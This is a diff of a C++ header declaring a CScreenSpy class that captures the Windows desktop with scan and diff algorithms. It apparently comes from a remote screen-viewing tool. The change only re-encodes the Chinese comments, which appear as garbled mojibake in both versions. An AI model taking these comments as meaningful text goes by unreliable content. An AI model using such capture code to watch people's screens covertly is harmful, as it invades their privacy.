@@ -1,4 +1,4 @@
-// ScreenSpy.h: interface for the CScreenSpy class.
+ï»¿// ScreenSpy.h: interface for the CScreenSpy class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -6,9 +6,9 @@
 
 #include "CursorInfo.h"
 
-// Á½ÖÖËã·¨
-#define ALGORITHM_SCAN	1	// ËÙ¶ÈºÜ¿ì£¬µ«ËéÆ¬Ì«¶à
-#define ALGORITHM_DIFF	2	// ËÙ¶ÈºÜÂı£¬Ò²Õ¼CPU£¬µ«ÊÇÊı¾İÁ¿¶¼ÊÇ×îĞ¡µÄ
+// ä¸¤ç§ç®—æ³•
+#define ALGORITHM_SCAN	1	// é€Ÿåº¦å¾ˆå¿«ï¼Œä½†ç¢ç‰‡å¤ªå¤š
+#define ALGORITHM_DIFF	2	// é€Ÿåº¦å¾ˆæ…¢ï¼Œä¹Ÿå CPUï¼Œä½†æ˜¯æ•°æ®é‡éƒ½æ˜¯æœ€å°çš„
 
 class CScreenSpy  
 {
@@ -29,26 +29,26 @@ private:
 	bool m_bIsGray;
 	DWORD m_dwBitBltRop;
 	DWORD m_dwLastCapture;
-	DWORD m_dwSleep;        //Ã¿Ò»Ö¡»¨·ÑµÄÊ±¼ä£¨ºÁÃë£©
+	DWORD m_dwSleep;        //æ¯ä¸€å¸§èŠ±è´¹çš„æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰
 	LPBYTE m_rectBuffer;
 	UINT m_rectBufferOffset;
 	BYTE m_nIncSize;
 	int m_nFullWidth, m_nFullHeight, m_nStartLine;
 	RECT m_changeRect;
-    HDC m_hFullDC;  //×ÀÃæ´°¿ÚDC
+    HDC m_hFullDC;  //æ¡Œé¢çª—å£DC
     HDC m_hLineMemDC, m_hFullMemDC, m_hRectMemDC;
 	HBITMAP m_hLineBitmap, m_hFullBitmap;
 	LPVOID m_lpvLineBits, m_lpvFullBits;
 	LPBITMAPINFO m_lpbmi_line, m_lpbmi_full, m_lpbmi_rect;
-	int	m_biBitCount;   //ÏñËØÎ»Êı
+	int	m_biBitCount;   //åƒç´ ä½æ•°
 	int	m_nDataSizePerLine;
 
-	LPVOID m_lpvDiffBits; // ²îÒì±È½ÏµÄÏÂÒ»ÕÅ
+	LPVOID m_lpvDiffBits; // å·®å¼‚æ¯”è¾ƒçš„ä¸‹ä¸€å¼ 
 	HDC	m_hDiffDC, m_hDiffMemDC;
 	HBITMAP	m_hDiffBitmap;
 
 	CCursorInfo	m_CursorInfo;
-	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // ½µµÍCPU
+	void ScanScreen(HDC hdcDest, HDC hdcSrc, int nWidth, int nHeight); // é™ä½CPU
 	int Compare(LPBYTE lpSource, LPBYTE lpDest, LPBYTE lpBuffer, DWORD dwSize);
 	LPBITMAPINFO ConstructBI(int biBitCount, int biWidth, int biHeight);
 	void WriteRectBuffer(LPBYTE	lpData, int nCount);
